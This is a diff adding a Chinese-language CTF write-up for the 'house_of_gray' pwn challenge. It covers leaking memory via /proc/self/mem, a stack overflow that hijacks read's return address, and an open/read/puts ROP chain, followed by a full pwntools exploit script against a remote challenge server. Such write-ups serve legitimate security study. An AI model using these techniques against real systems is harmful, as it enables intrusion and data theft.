@@ -2826,3 +2826,199 @@ if __name__ == '__main__':
     io.send(b'/bin/sh\x00')
     io.interactive()
 ```
+
+### 31. house_of_gray
+题目：暂无
+
+思路：通过读取/proc/self/maps和/proc/self/mem文件实现进程任意地址空间内存读取找到elf加载基址和栈地址，再配合栈溢出修改变量实现对栈的写入，简介实现ROP攻击读取flag文件。
+
+#### seccomp-tools
+可以检查程序是否禁用了某些关键的系统调用。
+
+#### /proc文件系统
+/proc/self/maps(或者/proc/(pid)/maps,这个需要root权限)文件保存了当前进程的内存映射情况，可以找到elf文件的加载基址，堆和栈的地址范围。
+
+/proc/self/mem(或者/proc/(pid)/mem,这个需要root权限)文件提供了一个读取当前进程任意内存地址的接口，但是再读取前需要使用seek指定到正确的地址范围（通过maps文件可以获取）。
+
+#### gdb调试指令s,n,si,ni
+s: 执行一行程序代码，如果此行代码中有函数调用，则进入该函数，相当于其它调试器中的“Step Into (单步跟踪进入)”
+
+n: 执行一行程序代码，此行代码中的函数调用也一并执行，相当于其它调试器中的“Step Over (单步跟踪)”
+
+s、n这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。
+
+#### gdb多进程调试
+如下的代码
+```python
+io = process('elf')
+# do something
+gdb.attach(io)
+```
+如果在gdb.attach之前进程已经创建了新的进程，那么gdb不会跟踪新的进程，如果还没有创建新进程，在后续程序在创建新的进程时会被gdb跟踪。因此如果想要跟踪新的进程，gdb.attach应该在创建新进程之前被调用，或者使用gdb.debug创建进程，调试时建议可以关闭aslr，方便下断点。
+```python
+io = gdb.debug('./elf', aslr=False, gdbscript='''
+b main
+continue
+''')
+```
+
+#### 解题思路
+通过逆向分析发现题目提供了读取任意文件任意位置内容（flag文件除外）和在堆空间写入数据的功能，此外在设置文件名时存在栈溢出漏洞。先用checksec查看elf的防护功能全开，普通的栈溢出肯定是不行的，仔细分析程序发现通过栈溢出可以覆盖buf后面一个写入地址指针变量，通过覆盖这个变量可以导致任意地址写入，这里的关键就是应该将这个变量覆盖成什么值。
+
+由于开启了防护机制got表无法修改，只能修改全局数据或堆栈数据，全局数据和堆栈数据中都没有类似函数指针的变量可以利用，因此可以考虑直接修改堆栈中的返回地址，这里修改的是read函数的返回地址，read函数执行完成后就可以返回到我们控制的地址了，后续就可以使用常规ROP的方式实现我们需要的功能了。正好本题提供了读文件（任意位置）功能，可以通过读取/proc/self/maps和/proc/self/mem文件在内存中搜索栈中特殊字符串确定栈地址。由于可以确定栈中保存了/proc/self/mem这个字符串，因此可以通过在内存中搜索这个字符串确定这个临时变量的地址，进而确定栈的分布。这里还有个问题就是题目限定了读取文件的长度和次数，因此可能需要多次搜索才能得到正确的地址（大约1/7的概率可以找到）。
+
+假设找到的栈空间是这样的：
+```python
+rsp（buf_addr-0x30）   --> read函数调用前的栈顶
+buf_addr              --> /proc/self/mem
+buf_addr+24           --> void *v8(写入指针)
+```
+那么调用read函数时，read的返回地址会压入栈内，因此read的返回地址是buf的地址-0x38，因此在栈溢出的payload应为：
+```python
+payload = b'/proc/self/mem'
+payload = payload.ljust(24, b'\x00') + p64(buf_addr - 0x38)
+```
+这样再程序调用read(0, v8, 0x200)时就可以覆盖从read返回地址及其以下的内容了。这里存在一个坑，使用seccomp-tools ./house查看发现execve系统调用被禁用了，意味着无法执行/bin/sh获取shell，只能通过构造打开文件，读文件的方式获取flag了，rop链如下
+```python
+# open('/home/ctf/flag', 0)
+read_ret_addr  -->pop_rdi
+               -->flag_file_addr
+               -->pop_rsi_r15
+               -->0
+               -->0
+               -->open_addr
+# read(6, flag_file_addr, 0x200)
+               -->pop_rdi
+# 这里6是上一个打开的文件描述符
+# 由于系统默认占用了0，1，2
+# 程序首先打开了/proc/self/maps，再打开了/proc/self/mem，最后栈溢出又打开了/proc/self/mem
+# 因此新打开的文件描述符为6
+               -->6
+               -->pop_rsi_r15
+               -->flag_file_addr
+               -->0
+# 这里没有找到pop_rdx的ROP指令
+# 但是调试发现在调用read前rdx被设置的0x200在执行完后没变，因此不用设置rdx
+               -->read_addr
+# puts(flag_file_addr)
+               -->pop_rdi
+               -->flag_file_addr
+               -->puts_addr
+# 可以计算出flag_file_addr和buf_addr相差的距离为15*8
+flag_file_addr -->/home/ctf/flag
+```
+
+全部利用代码如下：
+```python
+from pwn import *
+
+debug = False
+if debug:
+    io = process('./house', aslr=False)
+    gdb.attach(io, gdbscript='''
+b *0x00005555555552bb
+continue
+''')
+    pause()
+else:
+    io = remote('220.249.52.134', 41480)
+
+elf = ELF('house')
+pop_rdi = 0x1823
+pop_rsi_r15 = 0x1821
+
+def set_filename(filename):
+    io.sendlineafter('Exit\n', '1')
+    io.sendlineafter('?\n', filename)
+
+def seek(offset):
+    log.info('seek to: 0x%x' % offset)
+    io.sendlineafter('Exit\n', '2')
+    io.sendlineafter('?\n', '%d' % offset)
+
+def read_content():
+    io.sendlineafter('Exit\n', '3')
+    io.sendlineafter('?\n', '100000')
+    content = io.recvuntil('1.F')[19:-3]
+    return content
+
+# 在本地aslr开启、关闭、远程调试下/proc/self/maps输出的行序列不同
+# 因此采用搜索的方法确定elf和mmap内存空间
+def get_elf_mmap(lines):
+    elf_line = None
+    mmap_line = None
+    for l in lines:
+        base = int(l.split('-')[0], 16)
+        end = int(l.split('-')[1].split(' ')[0], 16)
+        if (end - base) == 0x10000000:
+            mmap_line = l
+        elif 'r-xp' in l and 'house' in l:
+            elf_line = l
+    return [elf_line, mmap_line]
+
+if __name__ == '__main__':
+    # enter room
+    io.sendlineafter('?\n', 'y')
+
+    # read /proc/self/maps
+    set_filename('/proc/self/maps')
+    content = read_content()
+    lines = content.decode('utf8').strip().split('\n')
+    for i in lines:
+        print(i)
+
+    # get elf and mmap base
+    elf_line, mmap_line = get_elf_mmap(lines)
+    elf_base = int(elf_line.split('-')[0], 16)
+    mmap_base = int(mmap_line.split('-')[0], 16)
+    print('elf base: 0x%x' % elf_base)
+    print('mmap base: 0x%x' % mmap_base)
+    read_addr = elf_base + elf.plt['read']
+    open_addr = elf_base + elf.plt['open']
+    puts_addr = elf_base + elf.plt['puts']
+    pop_rdi += elf_base
+    pop_rsi_r15 += elf_base
+
+    # search stack addr
+    set_filename('/proc/self/mem')
+    # 尽量从中间开始搜索，不过效果差不太多
+    addr_start = mmap_base + 0x7fffff - 1200000
+    # seek只需要调用一次，后续读文件时指针会自动移动！！！
+    seek(addr_start)
+    buf_addr = None
+    for i in range(24):
+        content = read_content()
+        if b'/proc/self/mem' in content:
+            buf_addr = addr_start + i * 100000
+            buf_addr += len(content.split(b'/proc/self/mem')[0])
+            log.success('find buf addr: 0x%x' % buf_addr)
+            break
+        #pause()
+    if not buf_addr:
+        print('cannot find buf addr, try again!')
+        exit(-1)
+    read_ret_addr = buf_addr - 0x38
+    log.success('read ret addr: 0x%x' % read_ret_addr)
+
+    # read buf overflow v8 with read_ret_addr
+    payload = b'/proc/self/maps'
+    payload = payload.ljust(0x50-0x38, b'\x00') + p64(read_ret_addr)
+    set_filename(payload)
+
+    # write rop to read_ret_addr
+    io.sendlineafter('Exit\n', '4')
+    flag_str_addr = read_ret_addr + 15 * 8
+    # open('/home/ctf/flag\x00', 0)
+    payload = p64(pop_rdi) + p64(flag_str_addr) + p64(pop_rsi_r15) + p64(0) + p64(0)
+    payload += p64(open_addr)
+    # read(6, addr, 0x200)
+    # now rdx is 0x200
+    payload += p64(pop_rdi) + p64(6) + p64(pop_rsi_r15) + p64(flag_str_addr) + p64(0)
+    payload += p64(read_addr)
+    # puts(addr)
+    payload += p64(pop_rdi) + p64(flag_str_addr) + p64(puts_addr)
+    payload += b'/home/ctf/flag\x00'
+
+    io.sendafter(':', payload)
+    io.interactive()
+```
